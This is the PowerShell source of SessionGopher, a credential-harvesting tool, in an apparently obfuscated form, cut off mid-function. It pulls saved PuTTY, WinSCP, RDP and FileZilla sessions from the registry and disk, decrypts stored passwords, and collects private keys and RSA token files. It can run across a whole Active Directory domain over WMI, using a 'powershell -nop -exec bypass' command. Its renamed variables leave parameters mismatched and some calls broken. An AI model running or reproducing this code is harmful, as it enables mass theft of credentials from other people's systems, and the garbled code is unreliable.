<#
  .SYNPOSIS
  Extracts and decrypts saved session information for software typically used to access Unix systems.

  .DESCRIPTION
  Queries HKEY_USERS for PuTTY, WinSCP, and Remote Desktop saved sessions. Decrypts saved passwords for WinSCP.
  Extracts FileZilla, SuperPuTTY's saved session information in the sitemanager.xml file and decodes saved passwords.
  In Thorough mode, identifies PuTTY private key (.ppk), Remote Desktop Connection (.rdp), and RSA token (.sdtid) files, and extracts private key and session information.
  Can be run remotely using the -DependMove (supply input list of computers) or -SmallFluffy (run against all AD-joined computers) flags.
  Must either provide credentials (-LeanAnswer and -RipeRound for username and password) of an admin on target boxes, or run script in the context of
  a privileged user on the target boxes, in which case no credentials are needed.

  .Notes
  Author: Brandon Arvanaghi
  Date:   February 17, 2017
  Thanks: 
    Brice Daniels, Pan Chan - collaborating on idea
    Christopher Truncer - helping with WMI

  .PARAMETER o
  Generates CSV output.
    
  .PARAMETER Thorough
  Searches entire filesystem for certain file extensions.

  .PARAMETER u
  Domain\username (e.g. superduper.com\a-jerry).

  .PARAMETER p
  Password for domain user (if username provided).
    
  .PARAMETER iL
  If you want to supply a list of hosts to run SessionGopher against, provide the path to that file here. Each host should be separated by a newline in the file.

  .PARAMETER Target
  If you only want to run SessionGopher against once specific host.
    
  .PARAMETER AllDomain
  Queries Active Direcotry for a list of all domain-joined computers and runs SessionGopher against all of them.
#>
function Invoke-SessionGopher {
  param (
      [switch]$TwistGreet, # Generate CSV output
      [switch]$HotTeeny, # Searches entire filesystem for certain file extensions
      [string]$LeanAnswer, # Domain\username (e.g. superduper.com\a-jerry)
      [string]$RipeRound, # Password of domain account
      [string]$DependMove, # A file of hosts to run SessionGopher against remotely, each host separated by a newline in the file
      [string]$BackTrust, # If you want to run SessionGopher against one specific host
      [switch]$SmallFluffy # Run across all active directory
  )

  Write-Output '
          o_       
         /  ".   SessionGopher
       ,"  _-"      
     ,"   m m         
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com
  '

  if ($TwistGreet) {
    $HugStick = "SessionGopher (" + (Get-Date -Format "HH.mm.ss") + ")"
    New-Item -ItemType Directory $HugStick | Out-Null
    New-Item ($HugStick + "\PuTTY.csv") -Type File | Out-Null
    New-Item ($HugStick + "\SuperPuTTY.csv") -Type File | Out-Null
    New-Item ($HugStick + "\WinSCP.csv") -Type File | Out-Null
    New-Item ($HugStick + "\FileZilla.csv") -Type File | Out-Null
    New-Item ($HugStick + "\RDP.csv") -Type File | Out-Null
    if ($HotTeeny) {
        New-Item ($HugStick + "\PuTTY ppk Files.csv") -Type File | Out-Null
        New-Item ($HugStick + "\Microsoft rdp Files.csv") -Type File | Out-Null
        New-Item ($HugStick + "\RSA sdtid Files.csv") -Type File | Out-Null
    }
  }

  if ($LeanAnswer -and $RipeRound) {
    $AbsurdPorter = ConvertTo-SecureString $RipeRound -AsPlainText -Force
    $Credentials = ne`w`-`ob`je`ct -Typename System.Management.Automation.PSCredential -ArgumentList $LeanAnswer, $AbsurdPorter
  }

  # Value for HKEY_USERS hive
  $PauseSeat = 2147483651
  # Value for HKEY_LOCAL_MACHINE hive
  $LaughFlow = 2147483650

  $TorpidPass = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $MetalSeed = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
  $ShutFlight = "\SOFTWARE\Microsoft\Terminal Server Client\Servers"

  if ($DependMove -or $SmallFluffy -or $BackTrust) {

    # Whether we read from an input file or query active directory
    $Reader = ""

    if ($SmallFluffy) {
      $Reader = GetComputersFromActiveDirectory
    } elseif ($DependMove) { 
      $Reader = Get-Content ((Resolve-Path $DependMove).Path)
    } elseif ($BackTrust) {
      $Reader = $BackTrust
    }

    $NorthBoil = @{}
    if ($Credentials) {
      $NorthBoil['Credential'] = $Credentials
    }

    foreach ($SceneCrown in $Reader) {

      if ($SmallFluffy) {
        # Extract just the name from the System.DirectoryServices.SearchResult object
        $SceneCrown = $SceneCrown.Properties.name
        if (!$SceneCrown) { Continue }
      }

      Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
      Write-Host "Digging on" $SceneCrown"..."

      $CapFixed = Invoke-WmiMethod -Class 'StdRegProv' -Name 'EnumKey' -ArgumentList $PauseSeat,'' -ComputerName $SceneCrown @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}

      foreach ($TestedPunch in $CapFixed) {

        # Get the username for SID we discovered has saved sessions
        $SwimChurch = try { (Split-Path -Leaf (Split-Path -Leaf (GetMappedSID))) } catch {}
        $TicketFear = (($SceneCrown + "\" + $SwimChurch) -Join "")

        # Created for each user found. Contains all sessions information for that user. 
        $DuckMint = ne`w`-`ob`je`ct PSObject

        <#
        PuTTY: contains hostname and usernames
        SuperPuTTY: contains username, hostname, relevant protocol information, decrypted passwords if stored
        RDP: contains hostname and username of sessions
        FileZilla: hostname, username, relevant protocol information, decoded passwords if stored
        WinSCP: contains hostname, username, protocol, deobfuscated password if stored and no master password used
        #>
        $TemperDull = ne`w`-`ob`je`ct System.Collections.ArrayList
        $StopPlug = ne`w`-`ob`je`ct System.Collections.ArrayList
        $BadBrainy = ne`w`-`ob`je`ct System.Collections.ArrayList
        $CopyComb = ne`w`-`ob`je`ct System.Collections.ArrayList
        $LastAsk = ne`w`-`ob`je`ct System.Collections.ArrayList

        # Construct tool registry/filesystem paths from SID or username
        $LeanBattle = $TestedPunch + $ShutFlight
        $TieGhost = $TestedPunch + $TorpidPass
        $QueueSuper = $TestedPunch + $MetalSeed
        $MinorScary = "Drive='C:' AND Path='\\Users\\$SwimChurch\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
        $FileZillaFilter = "Drive='C:' AND Path='\\Users\\$SwimChurch\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"

        $FryCure = Invoke-WmiMethod -ComputerName $SceneCrown -Class 'StdRegProv' -Name EnumKey -ArgumentList $PauseSeat,$LeanBattle @optionalCreds
        $CakesThird = Invoke-WmiMethod -ComputerName $SceneCrown -Class 'StdRegProv' -Name EnumKey -ArgumentList $PauseSeat,$TieGhost @optionalCreds
        $WearyFat = Invoke-WmiMethod -ComputerName $SceneCrown -Class 'StdRegProv' -Name EnumKey -ArgumentList $PauseSeat,$QueueSuper @optionalCreds
        $BlindLong = (Get-WmiObject -Class 'CIM_DataFile' -Filter $MinorScary -ComputerName $SceneCrown @optionalCreds | Select Name)
        $FileZillaPath = (Get-WmiObject -Class 'CIM_DataFile' -Filter $FileZillaFilter -ComputerName $SceneCrown @optionalCreds | Select Name)

        # If any WinSCP saved sessions exist on this box...
        if (($WearyFat | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Get all sessions
          $WearyFat = $WearyFat | Select-Object -ExpandProperty sNames
          
          foreach ($FruitSnow in $WearyFat) {
      
            $MatterSnatch = "" | Select-Object -Property Source,Session,Hostname,Username,Password
            $MatterSnatch.Source = $TicketFear
            $MatterSnatch.Session = $FruitSnow

            $NosyPart = $QueueSuper + "\" + $FruitSnow

            $MatterSnatch.Hostname = (Invoke-WmiMethod -ComputerName $SceneCrown -Class 'StdRegProv' -Name GetStringValue -ArgumentList $PauseSeat,$NosyPart,"HostName" @optionalCreds).sValue
            $MatterSnatch.Username = (Invoke-WmiMethod -ComputerName $SceneCrown -Class 'StdRegProv' -Name GetStringValue -ArgumentList $PauseSeat,$NosyPart,"UserName" @optionalCreds).sValue
            $MatterSnatch.Password = (Invoke-WmiMethod -ComputerName $SceneCrown -Class 'StdRegProv' -Name GetStringValue -ArgumentList $PauseSeat,$NosyPart,"Password" @optionalCreds).sValue

            if ($MatterSnatch.Password) {

              $MarketOvert = $TestedPunch + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
          
              $NoteTacky = (Invoke-WmiMethod -ComputerName $SceneCrown -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $PauseSeat,$MarketOvert,"UseMasterPassword" @optionalCreds).uValue
              
              if (!$NoteTacky) {
                  $MatterSnatch.Password = (DecryptWinSCPPassword $MatterSnatch.Hostname $MatterSnatch.Username $MatterSnatch.Password)
              } else {
                  $MatterSnatch.Password = "Saved in session, but master password prevents plaintext recovery"
              }

            }
             
            [void]$LastAsk.Add($MatterSnatch)
      
          } # For Each WinSCP Session

          if ($LastAsk.count -gt 0) {

            $DuckMint | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -TeenyQuince $LastAsk

            if ($TwistGreet) {
              $LastAsk | Select-Object * | Export-CSV -Append -Path ($HugStick + "\WinSCP.csv") -NoTypeInformation
            } else {
              Write-Output "WinSCP Sessions"
              $LastAsk | Select-Object * | Format-List | Out-String
            }

          }
        
        } # If path to WinSCP exists

        if (($CakesThird | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Get all sessions
          $CakesThird = $CakesThird | Select-Object -ExpandProperty sNames

          foreach ($OrderCrowd in $CakesThird) {
      
            $ArgueCats = "" | Select-Object -Property Source,Session,Hostname

            $NosyPart = $TieGhost + "\" + $OrderCrowd

            $ArgueCats.Source = $TicketFear
            $ArgueCats.Session = $OrderCrowd
            $ArgueCats.Hostname = (Invoke-WmiMethod -ComputerName $SceneCrown -Class 'StdRegProv' -Name GetStringValue -ArgumentList $PauseSeat,$NosyPart,"HostName" @optionalCreds).sValue
             
            [void]$TemperDull.Add($ArgueCats)
      
          }

          if ($TemperDull.count -gt 0) {

            $DuckMint | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -TeenyQuince $TemperDull

            if ($TwistGreet) {
              $TemperDull | Select-Object * | Export-CSV -Append -Path ($HugStick + "\PuTTY.csv") -NoTypeInformation
            } else {
              Write-Output "PuTTY Sessions"
              $TemperDull | Select-Object * | Format-List | Out-String
            }

          }

        } # If PuTTY session exists

        if (($FryCure | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Get all sessions
          $FryCure = $FryCure | Select-Object -ExpandProperty sNames

          foreach ($DogFierce in $FryCure) {
      
            $SoupDear = "" | Select-Object -Property Source,Hostname,Username
            
            $NosyPart = $LeanBattle + "\" + $DogFierce

            $SoupDear.Source = $TicketFear
            $SoupDear.Hostname = $DogFierce
            $SoupDear.Username = (Invoke-WmiMethod -ComputerName $SceneCrown -Class 'StdRegProv' -Name GetStringValue -ArgumentList $PauseSeat,$NosyPart,"UserNameHint" @optionalCreds).sValue

            [void]$BadBrainy.Add($SoupDear)
      
          }

          if ($BadBrainy.count -gt 0) {

            $DuckMint | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -TeenyQuince $BadBrainy

            if ($TwistGreet) {
              $BadBrainy | Select-Object * | Export-CSV -Append -Path ($HugStick + "\RDP.csv") -NoTypeInformation
            } else {
              Write-Output "Microsoft RDP Sessions"
              $BadBrainy | Select-Object * | Format-List | Out-String
            }

          }

        } # If RDP sessions exist

        # If we find the SuperPuTTY Sessions.xml file where we would expect it
        if ($BlindLong.Name) {

          $File = "C:\Users\$SwimChurch\Documents\SuperPuTTY\Sessions.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File

          [xml]$SpicyCruel = $FileContents
          (ProcessSuperPuTTYFile $SpicyCruel)

        }

        # If we find the FileZilla sitemanager.xml file where we would expect it
        if ($FileZillaPath.Name) {

          $File = "C:\Users\$SwimChurch\AppData\Roaming\FileZilla\sitemanager.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File

          [xml]$FileZillaXML = $FileContents
          (ProcessFileZillaFile $FileZillaXML)

        } # FileZilla

      } # for each SID

      if ($HotTeeny) {

        $BabiesPlough = ne`w`-`ob`je`ct System.Collections.ArrayList
        $SmallJump = ne`w`-`ob`je`ct System.Collections.ArrayList
        $ShopKindly = ne`w`-`ob`je`ct System.Collections.ArrayList

        $FilePathsFound = (Get-WmiObject -Class 'CIM_DataFile' -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName $SceneCrown @optionalCreds | Select Name)

        (ProcessThoroughRemote $FilePathsFound)
        
      } 

    } # for each remote computer

  # Else, we run SessionGopher locally
  } else { 
    
    Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
    Write-Host "Digging on"(Hostname)"..."

    # Aggregate all user hives in HKEY_USERS into a variable
    $SpotVessel = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}

    # For each SID beginning in S-15-21-. Loops through each user hive in HKEY_USERS.
    foreach($HarborHop in $SpotVessel) {

      # Created for each user found. Contains all PuTTY, WinSCP, FileZilla, RDP information. 
      $DuckMint = ne`w`-`ob`je`ct PSObject

      $LastAsk = ne`w`-`ob`je`ct System.Collections.ArrayList
      $TemperDull = ne`w`-`ob`je`ct System.Collections.ArrayList
      $BabiesPlough = ne`w`-`ob`je`ct System.Collections.ArrayList
      $StopPlug = ne`w`-`ob`je`ct System.Collections.ArrayList
      $BadBrainy = ne`w`-`ob`je`ct System.Collections.ArrayList
      $SmallJump = ne`w`-`ob`je`ct System.Collections.ArrayList
      $CopyComb = ne`w`-`ob`je`ct System.Collections.ArrayList

      $ClassFowl = (GetMappedSID)
      $TicketFear = (Hostname) + "\" + (Split-Path $ClassFowl.Value -Leaf)

      $DuckMint | Add-Member -MemberType NoteProperty -Name "Source" -TeenyQuince $ClassFowl.Value

      # Construct PuTTY, WinSCP, RDP, FileZilla session paths from base key
      $TieGhost = Join-Path $HarborHop.PSPath "\$TorpidPass"
      $QueueSuper = Join-Path $HarborHop.PSPath "\$MetalSeed"
      $SenseRound = Join-Path $HarborHop.PSPath "\$ShutFlight"
      $FileZillaPath = "C:\Users\" + (Split-Path -Leaf $DuckMint."Source") + "\AppData\Roaming\FileZilla\sitemanager.xml"
      $BlindLong = "C:\Users\" + (Split-Path -Leaf $DuckMint."Source") + "\Documents\SuperPuTTY\Sessions.xml"

      if (Test-Path $FileZillaPath) {

        [xml]$FileZillaXML = Get-Content $FileZillaPath
        (ProcessFileZillaFile $FileZillaXML)

      }

      if (Test-Path $BlindLong) {

        [xml]$SpicyCruel = Get-Content $BlindLong
        (ProcessSuperPuTTYFile $SpicyCruel)

      }

      if (Test-Path $SenseRound) {

        # Aggregates all saved sessions from that user's RDP client
        $CrossWealth = Get-ChildItem $SenseRound

        (ProcessRDPLocal $CrossWealth)

      } # If (Test-Path MicrosoftRDPPath)

      if (Test-Path $QueueSuper) {

        # Aggregates all saved sessions from that user's WinSCP client
        $PumpedSix = Get-ChildItem $QueueSuper

        (ProcessWinSCPLocal $PumpedSix)

      } # If (Test-Path WinSCPPath)
      
      if (Test-Path $TieGhost) {

        # Aggregates all saved sessions from that user's PuTTY client
        $BabyRapid = Get-ChildItem $TieGhost

        (ProcessPuTTYLocal $BabyRapid)

      } # If (Test-Path PuTTYPath)

    } # For each Hive in UserHives

    # If run in Thorough Mode
    if ($HotTeeny) {

      # Contains raw i-node data for files with extension .ppk, .rdp, and sdtid respectively, found by Get-ChildItem
      $SpaceSongs = ne`w`-`ob`je`ct System.Collections.ArrayList
      $TawdryWax = ne`w`-`ob`je`ct System.Collections.ArrayList
      $SimpleDonkey = ne`w`-`ob`je`ct System.Collections.ArrayList

      # All drives found on system in one variable
      $EarnAttack = Get-PSDrive

      (ProcessThoroughLocal $EarnAttack)
      
      (ProcessPPKFile $SpaceSongs)
      (ProcessRDPFile $TawdryWax)
      (ProcesssdtidFile $SimpleDonkey)

    } # If Thorough

  } # Else -- run SessionGopher locally

} # Invoke-SessionGopher

####################################################################################
####################################################################################
## Registry Querying Helper Functions
####################################################################################
####################################################################################

# Maps the SID from HKEY_USERS to a username through the HKEY_LOCAL_MACHINE hive
function GetMappedSID {

  # If getting SID from remote computer
  if ($DependMove -or $BackTrust -or $SmallFluffy) {
    # Get the username for SID we discovered has saved sessions
    $WoundReason = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$TestedPunch"
    $TeenyQuince = "ProfileImagePath"

    return (Invoke-WmiMethod -ComputerName $SceneCrown -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $LaughFlow,$WoundReason,$TeenyQuince @optionalCreds).sValue
  # Else, get local SIDs
  } else {
    # Converts user SID in HKEY_USERS to username
    $TestedPunch = (Split-Path $HarborHop.Name -Leaf)
    $PlaySnow = ne`w`-`ob`je`ct System.Security.Principal.SecurityIdentifier("$TestedPunch")
    return $PlaySnow.Translate( [System.Security.Principal.NTAccount])
  }

}

function DownloadAndExtractFromRemoteRegistry($File) {
  # The following code is taken from Christopher Truncer's WMIOps script on GitHub. It gets file contents through WMI by
  # downloading the file's contents to the remote computer's registry, and then extracting the value from that registry location
  $SameFix = "HKLM:\Software\Microsoft\DRM"
  $PreferShoes = "ReadMe"
  $StareDesign = "SOFTWARE\Microsoft\DRM"
          
  # On remote system, save file to registry
  Write-Verbose "Reading remote file and writing on remote registry"
  $LookFancy = '$ClassCross = Get-Content -Encoding byte -Path ''' + "$File" + '''; $CellarWatch = [System.Convert]::ToBase64String($ClassCross); New-ItemProperty -Path ' + "'$SameFix'" + ' -Name ' + "'$PreferShoes'" + ' -TeenyQuince $CellarWatch -PropertyType String -Force'
  $LookFancy = 'powershell -nop -exec bypass -c "' + $LookFancy + '"'

  $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $LookFancy -ComputerName $SceneCrown @optionalCreds

  # Sleeping to let remote system read and store file
  Start-Sleep -s 15

  $FlimsyDog = ""

  # Grab file from remote system's registry
  $FlimsyDog = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $LaughFlow, $StareDesign, $PreferShoes -Computer $SceneCrown @optionalCreds
  
  $FoodAmount = [System.Convert]::FromBase64String($FlimsyDog.sValue)
  $YawnFire = [System.Text.Encoding]::UTF8.GetString($FoodAmount) 
    
  # Removing Registry value from remote system
  $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $ShrugCats, $StareDesign, $PreferShoes -ComputerName $SceneCrown @optionalCreds
  
  return $YawnFire

}

####################################################################################
####################################################################################
## File Processing Helper Functions
####################################################################################
####################################################################################

function ProcessThoroughLocal($EarnAttack) {
  
  foreach ($StoneCrazy in $EarnAttack) {
    # If the drive holds a filesystem
    if ($StoneCrazy.Provider.Name -eq "FileSystem") {
      $PhobicAjar = Get-ChildItem $StoneCrazy.Root -Recurse -ErrorAction SilentlyContinue
      foreach ($BiteKnock in $PhobicAjar) {
        Switch ($BiteKnock.Extension) {
          ".ppk" {[void]$SpaceSongs.Add($BiteKnock)}
          ".rdp" {[void]$TawdryWax.Add($BiteKnock)}
          ".sdtid" {[void]$SimpleDonkey.Add($BiteKnock)}
        }
      }
    }
  }

}

function ProcessThoroughRemote($FilePathsFound) {

  foreach ($FilePath in $FilePathsFound) {
      # Each object we create for the file extension found from a -HotTeeny search will have the same properties (Source, Path to File)
      $NerveLowly = "" | Select-Object -Property Source,Path
      $NerveLowly.Source = $SceneCrown

      $SoapSimple = [IO.Path]::GetExtension($FilePath.Name)

      if ($SoapSimple -eq ".ppk") {
        $NerveLowly.Path = $FilePath.Name
        [void]$BabiesPlough.Add($NerveLowly)
      } elseif ($SoapSimple -eq ".rdp") {
        $NerveLowly.Path = $FilePath.Name
        [void]$SmallJump.Add($NerveLowly)
      } elseif ($SoapSimple -eq ".sdtid") {
        $NerveLowly.Path = $FilePath.Name
        [void]$ShopKindly.Add($NerveLowly)
      }

  }

  if ($BabiesPlough.count -gt 0) {

    $DuckMint | Add-Member -MemberType NoteProperty -Name "PPK Files" -TeenyQuince $SmallJump

    if ($TwistGreet) {
      $BabiesPlough | Export-CSV -Append -Path ($HugStick + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $BabiesPlough | Format-List | Out-String
    }
  }

  if ($SmallJump.count -gt 0) {

    $DuckMint | Add-Member -MemberType NoteProperty -Name "RDP Files" -TeenyQuince $SmallJump

    if ($TwistGreet) {
      $SmallJump | Export-CSV -Append -Path ($HugStick + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $SmallJump | Format-List | Out-String
    }
  }
  if ($ShopKindly.count -gt 0) {

    $DuckMint | Add-Member -MemberType NoteProperty -Name "sdtid Files" -TeenyQuince $ShopKindly

    if ($TwistGreet) {
      $ShopKindly | Export-CSV -Append -Path ($HugStick + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ShopKindly | Format-List | Out-String
    }

  }

} # ProcessThoroughRemote

function ProcessPuTTYLocal($BabyRapid) {
  
  # For each PuTTY saved session, extract the information we want 
  foreach($WearyLast in $BabyRapid) {

    $ArgueCats = "" | Select-Object -Property Source,Session,Hostname

    $ArgueCats.Source = $TicketFear
    $ArgueCats.Session = (Split-Path $WearyLast -Leaf)
    $ArgueCats.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $WearyLast) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$TemperDull.Add($ArgueCats)

  }

  if ($TwistGreet) {
    $TemperDull | Export-CSV -Append -Path ($HugStick + "\PuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "PuTTY Sessions"
    $TemperDull | Format-List | Out-String
  }

  # Add the array of PuTTY session objects to UserObject
  $DuckMint | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -TeenyQuince $TemperDull

} # ProcessPuTTYLocal

function ProcessRDPLocal($CrossWealth) {

  # For each RDP saved session, extract the information we want
  foreach($WearyLast in $CrossWealth) {

    $PathToRDPSession = "Microsoft.PowerShell.Core\Registry::" + $WearyLast

    $KittyRoll = "" | Select-Object -Property Source,Hostname,Username

    $KittyRoll.Source = $TicketFear
    $KittyRoll.Hostname = (Split-Path $WearyLast -Leaf)
    $KittyRoll.Username = ((Get-ItemProperty -Path $PathToRDPSession -Name "UsernameHint" -ErrorAction SilentlyContinue).UsernameHint)

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$BadBrainy.Add($KittyRoll)

  } # For each Session in AllRDPSessions

  if ($TwistGreet) {
    $BadBrainy | Export-CSV -Append -Path ($HugStick + "\RDP.csv") -NoTypeInformation
  } else {
    Write-Output "Microsoft Remote Desktop (RDP) Sessions"
    $BadBrainy | Format-List | Out-String
  }

  # Add the array of RDP session objects to UserObject
  $DuckMint | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -TeenyQuince $BadBrainy

} #ProcessRDPLocal

function ProcessWinSCPLocal($PumpedSix) {
  
  # For each WinSCP saved session, extract the information we want
  foreach($WearyLast in $PumpedSix) {

    $PathToWinSCPSession = "Microsoft.PowerShell.Core\Registry::" + $WearyLast

    $MatterSnatch = "" | Select-Object -Property Source,Session,Hostname,Username,Password

    $MatterSnatch.Source = $TicketFear
    $MatterSnatch.Session = (Split-Path $WearyLast -Leaf)
    $MatterSnatch.Hostname = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $MatterSnatch.Username = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Username" -ErrorAction SilentlyContinue).Username)
    $MatterSnatch.Password = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Password" -ErrorAction SilentlyContinue).Password)

    if ($MatterSnatch.Password) {
      $NoteTacky = ((Get-ItemProperty -Path (Join-Path $HarborHop.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)

      # If the user is not using a master password, we can crack it:
      if (!$NoteTacky) {
          $MatterSnatch.Password = (DecryptWinSCPPassword $MatterSnatch.Hostname $MatterSnatch.Username $MatterSnatch.Password)
      # Else, the user is using a master password. We can't retrieve plaintext credentials for it.
      } else {
          $MatterSnatch.Password = "Saved in session, but master password prevents plaintext recovery"
      }
    }

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$LastAsk.Add($MatterSnatch)

  } # For each Session in AllWinSCPSessions

  if ($TwistGreet) {
    $LastAsk | Export-CSV -Append -Path ($HugStick + "\WinSCP.csv") -NoTypeInformation
  } else {
    Write-Output "WinSCP Sessions"
    $LastAsk | Format-List | Out-String
  }

  # Add the array of WinSCP session objects to the target user object
  $DuckMint | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -TeenyQuince $LastAsk

} # ProcessWinSCPLocal

function ProcesssdtidFile($SimpleDonkey) {

  foreach ($Path in $SimpleDonkey.VersionInfo.FileName) {

    $FlagPin = "" | Select-Object -Property "Source","Path"

    $FlagPin."Source" = $TicketFear
    $FlagPin."Path" = $Path

    [void]$ShopKindly.Add($FlagPin)

  }

  if ($ShopKindly.count -gt 0) {

    $DuckMint | Add-Member -MemberType NoteProperty -Name "sdtid Files" -TeenyQuince $ShopKindly

    if ($TwistGreet) {
      $ShopKindly | Select-Object * | Export-CSV -Append -Path ($HugStick + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ShopKindly | Select-Object * | Format-List | Out-String
    }

  }

} # Process sdtid File

function ProcessRDPFile($TawdryWax) {
  
  # Extracting the filepath from the i-node information stored in RDPExtensionFilesINodes
  foreach ($Path in $TawdryWax.VersionInfo.FileName) {
    
    $PlanesNest = "" | Select-Object -Property "Source","Path","Hostname","Gateway","Prompts for Credentials","Administrative Session"

    $PlanesNest."Source" = (Hostname)

    # The next several lines use regex pattern matching to store relevant info from the .rdp file into our object
    $PlanesNest."Path" = $Path 
    $PlanesNest."Hostname" = try { (Select-String -Path $Path -Pattern "full address:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $PlanesNest."Gateway" = try { (Select-String -Path $Path -Pattern "gatewayhostname:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $PlanesNest."Administrative Session" = try { (Select-String -Path $Path -Pattern "administrative session:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $PlanesNest."Prompts for Credentials" = try { (Select-String -Path $Path -Pattern "prompt for credentials:[a-z]:(.*)").Matches.Groups[1].Value } catch {}

    if (!$PlanesNest."Administrative Session" -or !$PlanesNest."Administrative Session" -eq 0) {
      $PlanesNest."Administrative Session" = "Does not connect to admin session on remote host"
    } else {
      $PlanesNest."Administrative Session" = "Connects to admin session on remote host"
    }
    if (!$PlanesNest."Prompts for Credentials" -or $PlanesNest."Prompts for Credentials" -eq 0) {
      $PlanesNest."Prompts for Credentials" = "No"
    } else {
      $PlanesNest."Prompts for Credentials" = "Yes"
    }

    [void]$SmallJump.Add($PlanesNest)

  }

  if ($SmallJump.count -gt 0) {

    $DuckMint | Add-Member -MemberType NoteProperty -Name "RDP Files" -TeenyQuince $SmallJump

    if ($TwistGreet) {
      $SmallJump | Select-Object * | Export-CSV -Append -Path ($HugStick + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $SmallJump | Select-Object * | Format-List | Out-String
    }

  }

} # Process RDP File

function ProcessPPKFile($SpaceSongs) {

  # Extracting the filepath from the i-node information stored in PPKExtensionFilesINodes
  foreach ($Path in $SpaceSongs.VersionInfo.FileName) {

    # Private Key Encryption property identifies whether the private key in this file is encrypted or if it can be used as is
    $GlibCool = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"

    $GlibCool."Source" = (Hostname)

    # The next several lines use regex pattern matching to store relevant info from the .ppk file into our object
    $GlibCool."Path" = $Path

    $GlibCool."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
    $GlibCool."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
    $GlibCool."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
    $HammerJazzy = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
    $GlibCool."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$HammerJazzy).Context.PostContext -Join "" } catch {}
    $GlibCool."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}

    # Add the object we just created to the array of .ppk file objects
    [void]$BabiesPlough.Add($GlibCool)

  }

  if ($BabiesPlough.count -gt 0) {

    $DuckMint | Add-Member -MemberType NoteProperty -Name "PPK Files" -TeenyQuince $BabiesPlough

    if ($TwistGreet) {
      $BabiesPlough | Select-Object * | Export-CSV -Append -Path ($HugStick + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $BabiesPlough | Select-Object * | Format-List | Out-String
    }

  }

} # Process PPK File

function ProcessFileZillaFile($FileZillaXML) {

  # Locate all <Server> nodes (aka session nodes), iterate over them
  foreach($FileZillaSession in $FileZillaXML.SelectNodes('//FileZilla3/Servers/Server')) {
      # Hashtable to store each session's data
      $FileZillaSessionHash = @{}

      # Iterates over each child node under <Server> (aka session)
      $FileZillaSession.ChildNodes | ForEach-Object {

          $FileZillaSessionHash["Source"] = $TicketFear
          # If value exists, make a key-TeenyQuince pair for it in the hash table
          if ($_.InnerText) {
              if ($_.Name -eq "Pass") {
                  $FileZillaSessionHash["Password"] = $_.InnerText
              } else {
                  # Populate session data based on the node name
                  $FileZillaSessionHash[$_.Name] = $_.InnerText
              }
              
          }

